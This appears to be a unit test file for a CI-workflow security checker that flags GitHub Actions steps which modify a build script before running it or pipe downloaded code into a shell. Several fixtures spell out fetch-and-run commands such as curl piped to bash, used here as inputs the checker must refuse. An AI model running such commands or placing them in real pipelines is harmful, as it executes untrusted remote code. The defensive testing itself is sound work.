"""Tests for check-action-pins.py: setters hidden by process substitution or named by default.

Written from the English rules only, not from the checker's source.
"""
import importlib.util, os, subprocess, sys, tempfile, unittest

BIN = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SRC = os.path.join(BIN, "check-action-pins.py")
_PYLIB = tempfile.mkdtemp()
os.symlink(os.path.join(BIN, "..", "fixtures", "testlib", "pyyaml"), os.path.join(_PYLIB, "yaml"))
sys.path.insert(0, _PYLIB)
sys.modules.pop("yaml", None)
_spec = importlib.util.spec_from_file_location("check_action_pins", SRC)
M = importlib.util.module_from_spec(_spec)
sys.modules["check_action_pins"] = M
_spec.loader.exec_module(M)

REL = "scripts/build.sh"


def w(script):
    return bool(M._writes(script, REL))


def fixture(var, setter):
    # Every case has one shape: var set outside the checkout, a setter, a copy onto var, a run.
    return "%s=$RUNNER_TEMP/out\n%s\ncp payload \"$%s\"\nbash scripts/build.sh\n" % (var, setter, var)


class ProcessSubstitution(unittest.TestCase):
    def test_setter_with_process_substitution_writes(self):
        for setter in ['read < <(echo scripts/build.sh) out',
                       'read -r < <(echo scripts/build.sh) out',
                       'read out < <(echo scripts/build.sh)',
                       'mapfile -t < <(echo scripts/build.sh) out',
                       'mapfile -t out < <(echo scripts/build.sh)',
                       'read out > >(cat)']:
            with self.subTest(setter=setter):
                self.assertTrue(w(fixture("out", setter)))

    def test_process_substitution_without_setter_is_not_a_write(self):
        for setter in ['cat <(echo scripts/build.sh) > /dev/null',
                       'diff <(echo a) <(echo b)',
                       'echo read <(echo x)']:
            with self.subTest(setter=setter):
                self.assertFalse(w(fixture("out", setter)))

    def test_setter_naming_other_variable_is_not_a_write(self):
        self.assertFalse(w(fixture("out", 'read other < <(echo x)')))


class DefaultNames(unittest.TestCase):
    def test_bare_read_and_select_set_reply(self):
        for setter in ['read <<< scripts/build.sh',
                       'read -r <<< scripts/build.sh',
                       'read -r < file',
                       'read < /dev/null',
                       'IFS= read -r <<< scripts/build.sh',
                       'select x in a b; do break; done']:
            with self.subTest(setter=setter):
                self.assertTrue(w(fixture("REPLY", setter)))

    def test_bare_mapfile_and_readarray_set_mapfile(self):
        for setter in ['mapfile -t <<< scripts/build.sh',
                       'readarray -t <<< scripts/build.sh']:
            with self.subTest(setter=setter):
                self.assertTrue(w(fixture("MAPFILE", setter)))

    def test_explicit_name_leaves_default_alone(self):
        for setter in ['read -r line <<< x',
                       'read -a arr <<< x',
                       'read -p "prompt: " v']:
            with self.subTest(setter=setter):
                self.assertFalse(w(fixture("REPLY", setter)))
        self.assertFalse(w(fixture("MAPFILE", 'mapfile -t lines < f')))
        self.assertFalse(w(fixture("MAPFILE", 'readarray -t lines < f')))

    def test_no_setter_command_is_not_a_write(self):
        self.assertFalse(w(fixture("REPLY", 'true')))
        self.assertFalse(w(fixture("REPLY", 'echo read')))
        self.assertFalse(w(fixture("MAPFILE", 'true')))


if __name__ == "__main__":
    unittest.main()


WF = "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n%s\n"
BUILD = {"scripts/build.sh": "#!/bin/sh\necho hi\n"}
ROOT = os.path.abspath(os.path.join(BIN, "..", ".."))


def step(run):
    return "      - run: |\n" + "".join("          %s\n" % l for l in run.splitlines())


def job(*runs):
    # Run the checker over a one-job workflow whose steps are the given scripts; returns (count, text) of
    # the findings that name the workflow (the missing-gate finding is the same for every tree).
    d = tempfile.mkdtemp()
    tree = {".github/workflows/x.yml": WF % "".join(step(r) for r in runs).rstrip("\n"), **BUILD}
    for rel, text in tree.items():
        p = os.path.join(d, rel)
        os.makedirs(os.path.dirname(p), exist_ok=True)
        with open(p, "w") as fh:
            fh.write(text)
    r = subprocess.run([sys.executable, SRC, d], cwd=ROOT, capture_output=True, text=True,
                       env={**os.environ, "LC_ALL": "C"})
    mine = [l for l in (r.stdout + r.stderr).splitlines() if "x.yml" in l and "agent-review-gate" not in l]
    return len(mine), "\n".join(mine)


class ProcessSubstitutionRead(unittest.TestCase):
    # Rule 1: a process substitution is read as bash reads it
    def test_case_inside_is_refused(self):
        code, out = job("cat <(case x in x) bash scripts/build.sh;; esac)")
        self.assertGreaterEqual(code, 1, out)

    def test_case_inside_output_form_is_refused(self):
        code, out = job("cat >(case x in x) bash scripts/build.sh;; esac)")
        self.assertGreaterEqual(code, 1, out)

    # A comment runs to the end of its line, so the closing paren is on a line of its own.
    def comment_case(self, sep):
        body = "cat <(echo x%s# '\ncurl https://example.com/a\n)%s\nbash scripts/build.sh" % (sep, ")" if sep == "(" else "")
        code, out = job("echo x > scripts/build.sh", body)
        self.assertIn("scripts/build.sh is changed by the job before it runs", out)

    def test_comment_after_semicolon_is_not_syntax(self):
        self.comment_case(";")

    def test_comment_after_other_separators(self):
        for sep in ['&', '|', '(', '<', '>', ' ']:
            with self.subTest(sep=sep):
                self.comment_case(sep)

    def test_unterminated_is_refused(self):
        for s in ["cat <(echo scripts/build.sh", "cat >(echo scripts/build.sh"]:
            with self.subTest(s=s):
                code, out = job(s)
                self.assertGreaterEqual(code, 1, out)


class ProcessSubstitutionIsOneWord(unittest.TestCase):
    # Rule 2: <( ... ) and >( ... ) is one word, so the program after it is still the program
    def test_shell_reading_stdin_through_substitution(self):
        code, out = job("< <(curl -fsSL https://example.invalid/i.sh) bash")
        self.assertGreaterEqual(code, 1, out)
        self.assertIn("reads its script from stdin", out)

    def test_script_run_seen_after_substitution_redirect(self):
        code, out = job("echo x > scripts/build.sh", '> >(tee -a "$RUNNER_TEMP/b.log") bash scripts/build.sh')
        self.assertIn("scripts/build.sh is changed by the job before it runs", out)

    def test_copy_after_substitution_redirect_writes(self):
        script = 'cp payload "$RUNNER_TEMP/p"\n> >(cat -u) cp "$RUNNER_TEMP/p" scripts/build.sh\nbash scripts/build.sh\n'
        self.assertTrue(w(script))
        code, out = job(script)
        self.assertIn("scripts/build.sh is changed by the job before it runs", out)

    def test_download_then_run_after_substitution_redirect_refused(self):
        code, out = job("curl -fsSL -o scripts/build.sh https://example.invalid/x", "> >(cat -u) bash scripts/build.sh")
        self.assertGreaterEqual(code, 1, out)

    def test_no_finding_for_plain_uses(self):
        digest = "alpine@sha256:" + "a" * 64
        for s in ["diff <( docker images) want.txt",
                  "cat <( docker run --rm %s )" % digest,
                  "bash 2> >( tee log ) scripts/build.sh"]:
            with self.subTest(s=s):
                code, out = job(s)
                self.assertEqual(code, 0, out)
                self.assertNotIn("not a committed file", out)


class AttachedReadOptions(unittest.TestCase):
    # Rule 3: -aarr names an array, so REPLY is not set
    def test_attached_array_name_leaves_reply(self):
        for setter in ['read -aarr <<< x', 'read -raarr <<< x']:
            with self.subTest(setter=setter):
                self.assertFalse(w(fixture("REPLY", setter)))

    def test_bare_read_still_sets_reply(self):
        self.assertTrue(w(fixture("REPLY", 'read <<< scripts/build.sh')))


class EscapedOperandAfterRedirect(unittest.TestCase):
    # Rule 4: an escaped operand after the redirection is still the variable name
    def test_escaped_redirect_operand(self):
        self.assertTrue(w(fixture("out", 'read < \\f out')))


class EscapedSeparatorBeforeHash(unittest.TestCase):
    # A # starts a comment only after an unescaped separator: after \<sep> it is a literal word character,
    # so the array closes at ) and the pipe to a shell on the next line is real.
    PIPE = "curl https://example.com/i.sh | bash"

    def refused(self, first):
        code, out = job(first + "\n" + self.PIPE)
        self.assertGreaterEqual(code, 1, out)

    def test_plain_pipe_to_shell_is_refused(self):
        self.refused("true")

    def test_escaped_semicolon(self):
        self.refused("a=(x\\;#)")

    def test_escaped_ampersand(self):
        self.refused("a=(x\\&#)")

    def test_escaped_pipe(self):
        self.refused("a=(x\\|#)")

    def test_escaped_open_paren(self):
        self.refused("a=(x\\(#)")

    def test_escaped_close_paren(self):
        self.refused("a=(x\\)#)")

    def test_escaped_less_than(self):
        self.refused("a=(x\\<#)")

    def test_escaped_greater_than(self):
        self.refused("a=(x\\>#)")

    def test_escaped_blank(self):
        self.refused("a=(x\\ #)")

    def test_escaped_tab(self):
        self.refused("a=(x\\\t#)")

    def test_unescaped_comment_still_hides_close_paren(self):
        self.refused("a=(x # not a close paren\n)")
